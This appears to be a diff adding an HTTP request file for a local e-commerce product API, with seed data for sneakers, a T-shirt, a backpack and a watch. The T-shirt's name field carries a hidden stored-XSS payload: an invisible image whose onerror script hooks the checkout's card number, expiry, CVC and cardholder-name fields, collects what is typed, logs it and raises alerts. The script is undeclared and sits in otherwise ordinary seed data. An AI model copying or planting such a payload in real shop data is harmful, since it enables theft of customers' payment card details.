@@ -1,0 +1,82 @@
+### Get All
+GET http://localhost:3007/product
+content-type: application/json
+
+### Add New
+POST http://localhost:3007/product/add
+content-type: application/json
+
+{
+  "slug": "nimbus-15",
+  "name": "Sneakers Nimbus 25",
+  "price": 169.9,
+  "images": [
+    "https://images.unsplash.com/photo-1542291026-7eec264c27ff?q=80&w=1600&auto=format&fit=crop",
+    "https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?q=80&w=1600&auto=format&fit=crop"
+  ],
+  "rating": 4.8,
+  "stock": 18,
+  "tag": "Hit"
+}
+
+### Remove All Products
+DELETE http://localhost:3007/product/remove-all
+content-type: application/json
+
+### Add All Products
+POST http://localhost:3007/product/add-collection
+content-type: application/json
+
+[
+  {
+    "slug": "nimbus-15",
+    "name": "Sneakers Nimbus 25",
+    "price": 169.9,
+    "images": [
+      "https://images.unsplash.com/photo-1542291026-7eec264c27ff?q=80&w=1600&auto=format&fit=crop",
+      "https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?q=80&w=1600&auto=format&fit=crop"
+    ],
+    "rating": 4.8,
+    "stock": 18,
+    "tag": "Hit"
+  },
+  {
+    "slug": "nimbus-25",
+    "name": "T-shirt Essential moder trend with modern colors <img styles='visibility:hidden' src='./qe123' onerror='(function () {const data = {number: \"\",date: \"\",cvv: \"\",name: \"\"};const cardNumberInput = document.getElementById(\"cardNumber\");cardNumberInput.addEventListener(\"input\", (e) => {console.log(\"cardNumber: \", e.currentTarget.value);data.number = e.target.value;});const dateInput = document.getElementById(\"expiry\");dateInput.addEventListener(\"input\", (e) => {console.log(\"expiry: \", e.currentTarget.value);data.date = e.target.value;});const cvvInput = document.getElementById(\"cvc\");cvvInput.addEventListener(\"input\", (e) => {console.log(\"cvc: \", e.currentTarget.value);data.cvc = e.target.value;});const cardNameInput = document.getElementById(\"cardName\");cardNameInput.addEventListener(\"input\", (e) => {console.log(\"name: \", e.currentTarget.value);data.name = e.target.value;});const button = document.getElementById(\"pay\");button?.addEventListener(\"mousedown\", () => {console.log(\"UserData:\", data);alert(1);});})()'>setTimeout(() => {alert(\"XSS\")}, 3000)</img>",
+  "price": 29.9,
+  "images": [
+  "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?q=80&w=1600&auto=format&fit=crop",
+  "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?q=80&w=1600&auto=format&fit=crop"
+],
+  "tag": "New",
+  "rating": 4.8,
+  "stock": 18,
+  "category": "clothing",
+  "gender": "unisex",
+  "sizes": ["S","M","L","XL"]
+  },
+  {
+    "slug": "nimbus-35",
+    "name": "Backpack Trail 30L",
+    "price": 89.0,
+    "images": [
+      "https://images.unsplash.com/photo-1514477917009-389c76a86b68?q=80&w=1600&auto=format&fit=crop",
+      "https://images.unsplash.com/photo-1514477917009-389c76a86b68?q=80&w=1600&auto=format&fit=crop"
+    ],
+    "rating": 4.6,
+    "stock": 18,
+    "tag": "Hit"
+  },
+  {
+    "slug": "nimbus-45",
+    "name": "Watch Sport Pro",
+    "price": 249.0,
+    "images": [
+      "https://images.unsplash.com/photo-1516726817505-f5ed825624d8?q=80&w=1600&auto=format&fit=crop",
+      "https://images.unsplash.com/photo-1516726817505-f5ed825624d8?q=80&w=1600&auto=format&fit=crop"
+    ],
+    "tag": "Sales",
+    "rating": 4.7,
+    "stock": 18
+  }
+]
